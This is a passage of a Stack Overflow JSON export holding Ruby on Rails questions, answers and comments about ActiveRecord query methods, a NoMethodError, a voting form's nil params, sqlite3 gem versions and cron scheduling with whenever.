you need to set it again in the update:</p>\n\n<pre><code>Attendance.joins(:user)\n  .where(users: {name: 'Bob'}, date: Time.zone.today)\n  .first_or_initialize\n  .update(user: User.find_by(name: 'Bob'), #other stuff ) # Update some columns after this\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1558377252, "post_id": 56222807, "comment_id": 99073318, "body": "<code>first_or_initialize_by</code> was never a method and both <code>find_or_initialize_by</code> and <code>first_or_initialize</code> are still viable"}, {"owner": {"reputation": 7856, "user_id": 79068, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/FNeR0.png?s=128&g=1", "display_name": "Ben Hull", "link": "https://stackoverflow.com/users/79068/ben-hull"}, "reply_to_user": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1558393381, "post_id": 56222807, "comment_id": 99078303, "body": "Thank you - edited. That said, I still can&#39;t find a reference to that method in the API docs at all - do you have a reference for it?"}, {"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1558396403, "post_id": 56222807, "comment_id": 99078805, "body": "<a href=\"https://github.com/rails/rails/blob/master/activerecord/lib/active_record/relation.rb#L127\" rel=\"nofollow noreferrer\">github.com/rails/rails/blob/master/activerecord/lib/&hellip;</a>"}, {"owner": {"reputation": 848, "user_id": 11249670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f29532e75e13b5f3b631012229f22829?s=128&d=identicon&r=PG&f=1", "display_name": "reesaspieces", "link": "https://stackoverflow.com/users/11249670/reesaspieces"}, "edited": false, "score": 0, "creation_date": 1558405025, "post_id": 56222807, "comment_id": 99080235, "body": "Thank you both. I realise it may be more natural to start from <code>User</code> and may end up doing so."}], "tags": [], "owner": {"reputation": 7856, "user_id": 79068, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/FNeR0.png?s=128&g=1", "display_name": "Ben Hull", "link": "https://stackoverflow.com/users/79068/ben-hull"}, "is_accepted": false, "score": 1, "last_activity_date": 1558396855, "last_edit_date": 1558396855, "creation_date": 1558361751, "answer_id": 56222807, "question_id": 56217535, "link": "https://stackoverflow.com/questions/56217535/how-to-use-the-joins-method-with-first-or-initialize-instead-of-find-or-initiali/56222807#56222807", "title": "How to use the joins method with first_or_initialize instead of find_or_initialize_by (Rails)?", "body": "<p>Rather than starting from the Attendance model, I would tend to start from the User, like this:</p>\n\n<p><code>User.find_by(name: 'Bob').attendances.find_or_initialize_by(date: Time.zone.today).update(...)</code></p>\n\n<p>That keeps things easy to read. You could add an association extension method to make things more convenient:</p>\n\n<pre><code>class User &lt; ActiveRecord::Base\n  has_many :attendances do\n    def for_date(date)\n      find_or_initialize_by(date: Time.zone.today)\n    end\n  end\nend\n\n# Then call with:\nUser.attendances.for_date(Time.zone.today)\n</code></pre>\n\n<p>Depending on what you're doing with that attendance record, you could also have your <code>for_date</code> method take extra arguments.</p>\n\n<p><s><code>first_or_initialize</code> has been removed according to: <a href=\"https://api.rubyonrails.org/classes/ActiveRecord/Relation.html\" rel=\"nofollow noreferrer\">https://api.rubyonrails.org/classes/ActiveRecord/Relation.html</a>.</s> <em>Thanks to @engineersmnky for the correction. The method is undocumented, but that looks likes a mistake.</em></p>\n"}], "owner": {"reputation": 848, "user_id": 11249670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f29532e75e13b5f3b631012229f22829?s=128&d=identicon&r=PG&f=1", "display_name": "reesaspieces", "link": "https://stackoverflow.com/users/11249670/reesaspieces"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1009, "favorite_count": 0, "answer_count": 2, "score": 6, "last_activity_date": 1558396855, "creation_date": 1558342853, "question_id": 56217535, "link": "https://stackoverflow.com/questions/56217535/how-to-use-the-joins-method-with-first-or-initialize-instead-of-find-or-initiali", "title": "How to use the joins method with first_or_initialize instead of find_or_initialize_by (Rails)?", "body": "<p>Is there a way to rewrite the process below, which currently uses <code>find_or_initialize_by</code>, using the <code>joins</code> method?</p>\n\n<p>For context - I have <code>users</code> (employees) who record their <code>attendances</code> in the system (a <code>user</code> has many <code>attendances</code>, and an <code>attendance</code> record belongs to a <code>user</code>).</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>Attendance.find_or_initialize_by(\n  user: User.find_by(name: 'Bob'),\n  date: Time.zone.today\n)\n.update(...) # Update some columns after this\n</code></pre>\n\n<p>I'm trying to rewrite it using <code>.joins</code> like this:</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>Attendance.joins(:user)\n  .where(users: {name: 'Bob'}, date: Time.zone.today)\n  .first_or_initialize\n  .update(...) # Update some columns after this\n</code></pre>\n\n<p>My tests come back with mixed results:</p>\n\n<ul>\n<li>Test cases where the record only needs to be <code>updated</code> pass</li>\n<li>Test cases where the <code>attendance</code> record doesn't exist yet (i.e. cases when I have to <code>initialize</code>) fail</li>\n</ul>\n\n<p>The error message is\n<code>ActiveRecord::RecordInvalid: Validation failed: User must exist</code>.\nBut I'm confused because the user actually exists - if I debug using <code>byebug</code>, the user is there.</p>\n"}, {"tags": ["ruby"], "comments": [{"owner": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "edited": false, "score": 0, "creation_date": 1558342110, "post_id": 56217258, "comment_id": 99055189, "body": "The error is telling you that arrays don&#39;t have a <code>title</code> method. Which is correct. So, why are you trying to call <code>title</code> on an array? There&#39;s too much code in your question for me to find the problem, but the variable is called <code>albums</code> (album<b>s</b>, plural), so clearly you expect there to be multiple albums in that variable, no?"}], "answers": [{"tags": [], "owner": {"reputation": 5312, "user_id": 6535997, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/10156345016155058/picture?type=large", "display_name": "Mark", "link": "https://stackoverflow.com/users/6535997/mark"}, "is_accepted": false, "score": 0, "last_activity_date": 1558342246, "creation_date": 1558342246, "answer_id": 56217352, "question_id": 56217258, "link": "https://stackoverflow.com/questions/56217258/why-am-i-getting-undefined-method-title-for-array0x81c918-nomethoderror/56217352#56217352", "title": "Why am I getting undefined method `title&#39; for #&lt;Array:0x81c918&gt; (NoMethodError)?", "body": "<pre><code>def display_album(albums)\n    puts \"the album title is\" + albums.title.to_s\nend\n</code></pre>\n\n<p>You're feeding in an array of albums instead of one individual album. Change it to:</p>\n\n<pre><code>def display_album(album)\n    puts \"the album title is\" + album.title.to_s\nend\n</code></pre>\n\n<p>And when you call the method, make sure you call it with just one album as an argument rather than an array. The error is telling you you were calling the 'title' method on an array of albums, when you need to call it on just one item.</p>\n"}], "owner": {"reputation": 69, "user_id": 9769402, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Caleb Hyun", "link": "https://stackoverflow.com/users/9769402/caleb-hyun"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 69, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1558342246, "creation_date": 1558341876, "question_id": 56217258, "link": "https://stackoverflow.com/questions/56217258/why-am-i-getting-undefined-method-title-for-array0x81c918-nomethoderror", "title": "Why am I getting undefined method `title&#39; for #&lt;Array:0x81c918&gt; (NoMethodError)?", "body": "<p>I am trying to get albums.title (in the display_album method). Whenever I run the code through the terminal, it says undefine method 'title' for #. I think I put all instances correctly. I am not sure what I miss.  </p>\n\n<p>I tried to check if I put instances correctly and also debugging with p method to check if instance variables do not work across the class. </p>\n\n<pre><code>\n$genre = ['Null', 'Pop', 'Classic', 'Jazz', 'Rock']\n\nclass Album \n    attr_accessor :title, :artist, :genre, :tracks\n    def initialize(title, artist, genre, tracks)\n        @title = title\n        @artist = artist\n        @genre = genre\n        @tracks = tracks  \n    end\nend \n\ndef read_albums()\n    puts \"write a file name\"\n    afile = gets.chomp \n\n    file = File.new(afile, \"r\")\n    albums = Array.new()\n    if file \n         i =0 \n         count = file.gets.to_i\n         while i&lt;count \n                albums &lt;&lt; read_album(file) \n            i +=1 \n        end   \n    file.close\n    end \n    albums\nend\n\ndef read_album(file)\n    album_title = file.gets\n    album_artist = file.gets\n    album_genre = file.gets\n    album_tracks = read_tracks(file)\n    album = Album.new(album_title, album_artist, album_genre, album_tracks) \n    album       \nend\n\ndef display_albums(albums)\n    finished = false \n    begin\n    selection = read_integer_in_range(\"choose the number\", 1, 3)\n    case selection \n    when 1 \n        display_album(albums) \n    when 2\n        display_genres\n    when 3\n        finished = read_boolean 'Are you sure to exit ? (enter yes if yes)'\n    else   \n        puts 'Please select again'\n    end \n    end  \nend\n\ndef display_album(albums)\n    puts \"the album title is\" + albums.title.to_s\nend\n\ndef main_menu \nfinished = false \nbegin \nselection = read_integer_in_range('please select the number between 1 and 5', 1, 5)\ncase selection\nwhen 1\n    albums = read_albums\nwhen 2\n    display_albums(albums)\nwhen 3\n    play_album\nwhen 4\n    update_album\nwhen 5\n    finished = read_boolean 'Are you sure to exit ? (enter yes if yes)' \nelse\n      puts 'Please select again'\nend \n\nend until finished\nend  \n\nmain_menu\n</code></pre>\n\n<p>I expect to get a title name which is \"Coldplay Viva la Vida or Death and All His Friends\". </p>\n\n<p>The error message I got is music_player.rb:103:in <code>display_album': undefined method</code>title' for # (NoMethodError)</p>\n"}, {"tags": ["html", "ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 1266, "user_id": 7619578, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/c4b8b0d6308975901d498601dc6ffc7f?s=128&d=identicon&r=PG&f=1", "display_name": "Int&#39;l Man Of Coding Mystery", "link": "https://stackoverflow.com/users/7619578/intl-man-of-coding-mystery"}, "edited": false, "score": 0, "creation_date": 1558343807, "post_id": 56217074, "comment_id": 99056109, "body": "I&#39;ve had issues with hidden field to where I have to manually insert them into the params hash. <code>&lt;%= hidden_field_tag &#39;vote[vote_type]&#39;, 1 %&gt;</code> Would usually clear that up for me."}, {"owner": {"reputation": 13, "user_id": 7655017, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/7210f6455ac6a9308a0bc76e454291d6?s=128&d=identicon&r=PG&f=1", "display_name": "neX", "link": "https://stackoverflow.com/users/7655017/nex"}, "reply_to_user": {"reputation": 1266, "user_id": 7619578, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/c4b8b0d6308975901d498601dc6ffc7f?s=128&d=identicon&r=PG&f=1", "display_name": "Int&#39;l Man Of Coding Mystery", "link": "https://stackoverflow.com/users/7619578/intl-man-of-coding-mystery"}, "edited": false, "score": 0, "creation_date": 1558350232, "post_id": 56217074, "comment_id": 99059637, "body": "@MikeHeft Well that still doesn&#39;t work for me. This is so weird, I don&#39;t seem to miss anything, and the update method is called correctly. Only the param does not go through"}, {"owner": {"reputation": 1266, "user_id": 7619578, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/c4b8b0d6308975901d498601dc6ffc7f?s=128&d=identicon&r=PG&f=1", "display_name": "Int&#39;l Man Of Coding Mystery", "link": "https://stackoverflow.com/users/7619578/intl-man-of-coding-mystery"}, "edited": false, "score": 0, "creation_date": 1558352022, "post_id": 56217074, "comment_id": 99060659, "body": "Sorry, :(  Wish I was more help"}, {"owner": {"reputation": 1479, "user_id": 2506819, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b60435154915157dfd7ebfc04164930?s=128&d=identicon&r=PG", "display_name": "fanta", "link": "https://stackoverflow.com/users/2506819/fanta"}, "edited": false, "score": 0, "creation_date": 1558362761, "post_id": 56217074, "comment_id": 99066724, "body": "In the <code>elsif</code> body, shouldn&#39;t it be &quot;Downvote&quot; instead of &quot;Upvote&quot;. That won&#39;t fix it, but it&#39;s just a typo I think. And in that same <code>elsif</code>, aren&#39;t you missing the checkbox with value of <code>-1</code> ?, it should also update it, isn&#39;t it ?"}, {"owner": {"reputation": 13, "user_id": 7655017, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/7210f6455ac6a9308a0bc76e454291d6?s=128&d=identicon&r=PG&f=1", "display_name": "neX", "link": "https://stackoverflow.com/users/7655017/nex"}, "reply_to_user": {"reputation": 1479, "user_id": 2506819, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b60435154915157dfd7ebfc04164930?s=128&d=identicon&r=PG", "display_name": "fanta", "link": "https://stackoverflow.com/users/2506819/fanta"}, "edited": false, "score": 0, "creation_date": 1558363563, "post_id": 56217074, "comment_id": 99067182, "body": "@fanta what I&#39;m trying to implement is basically similar to reddit voting system. Once you upvote/downvote, clicking upvote/downvote again will destroy that vote (unvote), and clicking the opposite vote will make your vote to switch to that vote instead"}, {"owner": {"reputation": 1479, "user_id": 2506819, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b60435154915157dfd7ebfc04164930?s=128&d=identicon&r=PG", "display_name": "fanta", "link": "https://stackoverflow.com/users/2506819/fanta"}, "edited": false, "score": 0, "creation_date": 1558364171, "post_id": 56217074, "comment_id": 99067559, "body": "Ahh, so, you will always show &quot;Upvote&quot;, but clicking it again(in case you already upvoted it) will cause to destroy it. And clicking it again will Upvote it. Got it, I didn&#39;t see it that way in the beginning. Have you tried changing <code>form_for course.votes.build</code> to <code>form_for [course, Vote.find_by(user: current_user)]</code> ?, just for the first <code>if</code>"}, {"owner": {"reputation": 13, "user_id": 7655017, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/7210f6455ac6a9308a0bc76e454291d6?s=128&d=identicon&r=PG&f=1", "display_name": "neX", "link": "https://stackoverflow.com/users/7655017/nex"}, "reply_to_user": {"reputation": 1479, "user_id": 2506819, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b60435154915157dfd7ebfc04164930?s=128&d=identicon&r=PG", "display_name": "fanta", "link": "https://stackoverflow.com/users/2506819/fanta"}, "edited": false, "score": 0, "creation_date": 1558409505, "post_id": 56217074, "comment_id": 99080986, "body": "@fanta sorry, that doesn&#39;t work either"}], "owner": {"reputation": 13, "user_id": 7655017, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/7210f6455ac6a9308a0bc76e454291d6?s=128&d=identicon&r=PG&f=1", "display_name": "neX", "link": "https://stackoverflow.com/users/7655017/nex"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 49, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1558341215, "creation_date": 1558341215, "question_id": 56217074, "link": "https://stackoverflow.com/questions/56217074/param-returns-nil-value-when-passing-from-form-for-using-patch-method", "title": "Param returns nil value when passing from form_for using patch method", "body": "<p>I'm implementing a voting system where when the course is already upvoted/downvoted, clicking downvote/upvote will switch to that vote respectively and clicking again will delete that vote (similar to Reddit).\nWhile voting and destroying vote perform correctly, I'm having trouble trying to update the vote with form_for and patch method, where the value of the vote_type returns nil</p>\n\n<p>My Votes_Controller</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>class VotesController &lt; ApplicationController\n     def create\n       @vote = Vote.new(secure_params)\n\n       @vote.course = Course.find(params[:course_id])\n       if @vote.save\n           respond_to do |format|\n                   format.html { redirect_to :courses }\n                   format.js\n         end\n     end\n\n\n\n    def update\n          vote = Vote.find_by(user: current_user)\n\n          vote.update_attribute(:vote_type, update_vote_params)\n          redirect_to :courses\n    end   \n\n    def destroy\n          vote = Vote.find_by(user: current_user)\n          vote.destroy\n          redirect_to :courses, :notice =&gt; 'Unvoted!'\n    end   \n\n    private\n       def secure_params\n          params.require(:vote).permit( :user_id, :vote_type )\n       end\n\n       def update_vote_params\n          params.require(:vote).permit(:vote_type)\n       end\n  end  \n</code></pre>\n\n<p>My index.html.erb</p>\n\n<pre class=\"lang-html prettyprint-override\"><code>&lt;% if  Vote.exists?(user: current_user) &amp;&amp; Vote.find_by(user: current_user).vote_type.equal?(-1) %&gt;\n\n            &lt;%= form_for course.votes.build, url: course_vote_path(course, Vote.find_by(user: current_user).id), method: :patch do |f| %&gt;\n              &lt;%= f.hidden_field :vote_type, value: 1 %&gt;\n              &lt;%= f.submit 'Upvote', class: 'btn btn-default' %&gt;\n            &lt;% end %&gt;\n\n        &lt;% elsif Vote.exists?(user: current_user) &amp;&amp; Vote.find_by(user: current_user).vote_type.equal?(1) %&gt;\n            &lt;%= form_for course.votes.build, url: course_vote_path(course, Vote.find_by(user: current_user).id), method: :delete do |f| %&gt;\n            &lt;%= f.submit \"Upvote\", class: 'btn btn-default' %&gt;\n            &lt;% end %&gt;\n        &lt;% else %&gt;\n            &lt;%= form_for course.votes.build, url: course_votes_path(course) do |f| %&gt;\n              &lt;%= f.hidden_field :user_id, value: current_user.id %&gt;\n              &lt;%= f.hidden_field :vote_type, value: 1 %&gt;\n              &lt;%= f.submit 'Upvote', class: 'btn btn-default' %&gt;\n            &lt;% end %&gt;\n        &lt;% end %&gt;\n</code></pre>\n\n<p>My routes.rb</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code> Rails.application.routes.draw do\n     get 'vote/create'\n     get 'vote/destroy'\n     get 'courses/new'\n     get 'users/new'\n    resources :courses do\n          resources :votes, only: [:create, :destroy, :update]\n    end\n    resources :users\n end\n</code></pre>\n\n<p>I expect the param to pass 1 for vote_type, however, the actual output is nil</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "sqlite"], "comments": [{"owner": {"reputation": 1580, "user_id": 4041883, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CE0SX.jpg?s=128&g=1", "display_name": "CAmador", "link": "https://stackoverflow.com/users/4041883/camador"}, "edited": false, "score": 1, "creation_date": 1558340619, "post_id": 56216689, "comment_id": 99054417, "body": "Did you run <code>bundle install</code> after <code>rails new azer</code>?"}, {"owner": {"reputation": 3132, "user_id": 7167572, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/0Wbre.jpg?s=128&g=1", "display_name": "Tatranskymedved", "link": "https://stackoverflow.com/users/7167572/tatranskymedved"}, "edited": false, "score": 0, "creation_date": 1558340726, "post_id": 56216689, "comment_id": 99054471, "body": "Papy, the sentences like &quot;I&#39;m bad at english&quot; are purposively edited out of the question. They don&#39;t help readers in any way and if editor find issue with the question, he will help and edit it for you."}, {"owner": {"reputation": 35, "user_id": 11526842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5cd80701396164df7921ab9cbec0ec31?s=128&d=identicon&r=PG&f=1", "display_name": "Papy Poule", "link": "https://stackoverflow.com/users/11526842/papy-poule"}, "reply_to_user": {"reputation": 1580, "user_id": 4041883, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CE0SX.jpg?s=128&g=1", "display_name": "CAmador", "link": "https://stackoverflow.com/users/4041883/camador"}, "edited": false, "score": 0, "creation_date": 1558340979, "post_id": 56216689, "comment_id": 99054592, "body": "@CAmador yes, and it sadly doesn&#39;t solve the problem"}, {"owner": {"reputation": 35, "user_id": 11526842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5cd80701396164df7921ab9cbec0ec31?s=128&d=identicon&r=PG&f=1", "display_name": "Papy Poule", "link": "https://stackoverflow.com/users/11526842/papy-poule"}, "reply_to_user": {"reputation": 3132, "user_id": 7167572, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/0Wbre.jpg?s=128&g=1", "display_name": "Tatranskymedved", "link": "https://stackoverflow.com/users/7167572/tatranskymedved"}, "edited": false, "score": 0, "creation_date": 1558341344, "post_id": 56216689, "comment_id": 99054780, "body": "@Tatranskymedved Oh, sorry then. I just didn&#39;t want to get blamed for the lack of details"}, {"owner": {"reputation": 1580, "user_id": 4041883, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CE0SX.jpg?s=128&g=1", "display_name": "CAmador", "link": "https://stackoverflow.com/users/4041883/camador"}, "edited": false, "score": 0, "creation_date": 1558341693, "post_id": 56216689, "comment_id": 99054959, "body": "Is gem <code>sqlite3</code> actually installed? Run <code>gem list sqlite</code> to confirm. Is SQLite3 installed in your system?"}, {"owner": {"reputation": 35, "user_id": 11526842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5cd80701396164df7921ab9cbec0ec31?s=128&d=identicon&r=PG&f=1", "display_name": "Papy Poule", "link": "https://stackoverflow.com/users/11526842/papy-poule"}, "reply_to_user": {"reputation": 1580, "user_id": 4041883, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CE0SX.jpg?s=128&g=1", "display_name": "CAmador", "link": "https://stackoverflow.com/users/4041883/camador"}, "edited": false, "score": 0, "creation_date": 1558341991, "post_id": 56216689, "comment_id": 99055121, "body": "@CAmador Yes, sqlite3 (1.4.1)"}, {"owner": {"reputation": 830, "user_id": 642496, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/182757c8d4baebc5eb960251d7b983f1?s=128&d=identicon&r=PG", "display_name": "hernanvicente", "link": "https://stackoverflow.com/users/642496/hernanvicente"}, "edited": false, "score": 0, "creation_date": 1558344602, "post_id": 56216689, "comment_id": 99056529, "body": "Did you run: <code>bundle exec rails db:create</code>(Rails 5) or <code>bundle exec rake db:create</code>(Rails 4) ? If no, are you able to run this? Are you seeing errors o new messages?"}, {"owner": {"reputation": 830, "user_id": 642496, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/182757c8d4baebc5eb960251d7b983f1?s=128&d=identicon&r=PG", "display_name": "hernanvicente", "link": "https://stackoverflow.com/users/642496/hernanvicente"}, "edited": false, "score": 0, "creation_date": 1558344931, "post_id": 56216689, "comment_id": 99056707, "body": "Another question: If you are starting a new rails&#39; project, why are you don&#39;t using the last stable version? <code>rails 5.2.3</code> and <code>ruby 2.6.x</code>"}, {"owner": {"reputation": 830, "user_id": 642496, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/182757c8d4baebc5eb960251d7b983f1?s=128&d=identicon&r=PG", "display_name": "hernanvicente", "link": "https://stackoverflow.com/users/642496/hernanvicente"}, "edited": false, "score": 0, "creation_date": 1558345027, "post_id": 56216689, "comment_id": 99056771, "body": "Do you have already sqlite3 installed? Run <code>sqlite3 --version</code> from your terminal and tell us what is it returning please."}, {"owner": {"reputation": 35, "user_id": 11526842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5cd80701396164df7921ab9cbec0ec31?s=128&d=identicon&r=PG&f=1", "display_name": "Papy Poule", "link": "https://stackoverflow.com/users/11526842/papy-poule"}, "reply_to_user": {"reputation": 830, "user_id": 642496, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/182757c8d4baebc5eb960251d7b983f1?s=128&d=identicon&r=PG", "display_name": "hernanvicente", "link": "https://stackoverflow.com/users/642496/hernanvicente"}, "edited": false, "score": 0, "creation_date": 1558345565, "post_id": 56216689, "comment_id": 99057094, "body": "@hernanvicente Thanks for your help ! And I&#39;m not using the last version because my company&#39;s still working on an old one. I suggested using the latest versions but they don&#39;t want to"}], "answers": [{"comments": [{"owner": {"reputation": 830, "user_id": 642496, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/182757c8d4baebc5eb960251d7b983f1?s=128&d=identicon&r=PG", "display_name": "hernanvicente", "link": "https://stackoverflow.com/users/642496/hernanvicente"}, "edited": false, "score": 1, "creation_date": 1558345071, "post_id": 56218133, "comment_id": 99056797, "body": "Great, nice catch!"}], "tags": [], "owner": {"reputation": 1580, "user_id": 4041883, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CE0SX.jpg?s=128&g=1", "display_name": "CAmador", "link": "https://stackoverflow.com/users/4041883/camador"}, "is_accepted": true, "score": 1, "last_activity_date": 1558345021, "creation_date": 1558345021, "answer_id": 56218133, "question_id": 56216689, "link": "https://stackoverflow.com/questions/56216689/how-can-i-use-sqlite-3-with-rubyonrails/56218133#56218133", "title": "How can I use SQLite 3 with RubyOnRails?", "body": "<p>It seems version 1.4.x won't work with Rails 4. Install version 1.3.13 instead:</p>\n\n<p>Unisntall version 1.4.1:</p>\n\n<pre class=\"lang-sh prettyprint-override\"><code>gem uninstall sqlite3 -v1.4.1\n</code></pre>\n\n<p>Modify Gemfile:</p>\n\n<pre><code>gem 'sqlite3', '~&gt; 1.3.13'\n</code></pre>\n\n<p>And run <code>bundle install</code>.</p>\n"}], "owner": {"reputation": 35, "user_id": 11526842, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5cd80701396164df7921ab9cbec0ec31?s=128&d=identicon&r=PG&f=1", "display_name": "Papy Poule", "link": "https://stackoverflow.com/users/11526842/papy-poule"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 174, "favorite_count": 0, "accepted_answer_id": 56218133, "answer_count": 1, "score": 2, "last_activity_date": 1558345469, "creation_date": 1558339730, "last_edit_date": 1558345469, "question_id": 56216689, "link": "https://stackoverflow.com/questions/56216689/how-can-i-use-sqlite-3-with-rubyonrails", "title": "How can I use SQLite 3 with RubyOnRails?", "body": "<p>First, I'm bad at english, so I can't give a lot of details.. I've been trying to create a website using ruby on rails:</p>\n\n<pre><code>rails new azer\nrails generate controller pages home\n</code></pre>\n\n<p>The last command doesn't work and there's an error occuring during generating:</p>\n\n<blockquote>\n  <p>/home/esteban/.rbenv/versions/2.4.4/lib/ruby/gems/2.4.0/gems/activerecord-4.2.10/lib/active_record/connection_adapters/connection_specification.rb:177: in\n  'rescue in spec': Specified 'sqlite3' for database adapter, but the\n  gem is not loaded. Add gem 'sqlite3' to your Gemfile (and ensure its\n  version is at the minimum required by ActiveRecord).(Gem::LoadError)</p>\n</blockquote>\n\n<p>So I opened my gemfile: </p>\n\n<pre><code>source 'https://rubygems.org'\n# Bundle edge Rails instead: gem 'rails', github: 'rails/rails'\ngem 'rails', '4.2.10'\n# Use sqlite3 as the database for Active Record\ngem 'sqlite3'\n...\n...\n</code></pre>\n\n<p>I'm unsure what might be the error cause thus I don't know how to proceed.</p>\n\n<p>Versions:</p>\n\n<pre><code>Ruby     2.4.4\nRails    4.2.10\nSQLite3  1.4.1.\n</code></pre>\n\n<p>EDIT : Thanks for your help everyone, I appreciate it ! I just tried to reinstall rails and it worked</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "whenever"], "comments": [{"owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1558337314, "post_id": 56215904, "comment_id": 99052853, "body": "Did you run <code>whenever --update-crontab</code> on production?"}, {"owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1558337369, "post_id": 56215904, "comment_id": 99052873, "body": "Set your log file with <code>set :output, &quot;log&#47;cron_log.log&quot;</code>in schedule.rb file so you can check logs. which error coming"}, {"owner": {"reputation": 85, "user_id": 8592732, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8508fe8290a73a85666ae96e64165526?s=128&d=identicon&r=PG&f=1", "display_name": "js_beginner", "link": "https://stackoverflow.com/users/8592732/js-beginner"}, "reply_to_user": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1558337416, "post_id": 56215904, "comment_id": 99052903, "body": "@Vishal no.. how can I run that command on production?"}, {"owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1558337573, "post_id": 56215904, "comment_id": 99052971, "body": "Go to production server and directly run this command. <code>whenever --update-crontab</code>"}, {"owner": {"reputation": 2575, "user_id": 891359, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4926014a83c1d25207953e5e585556cb?s=128&d=identicon&r=PG", "display_name": "bo-oz", "link": "https://stackoverflow.com/users/891359/bo-oz"}, "edited": false, "score": 0, "creation_date": 1558337847, "post_id": 56215904, "comment_id": 99053101, "body": "It depends also on your prod environment. What are you using to put your app in production? AWS / GCS / Heroku / something else?"}, {"owner": {"reputation": 85, "user_id": 8592732, "user_type": "registered", "profile_image": 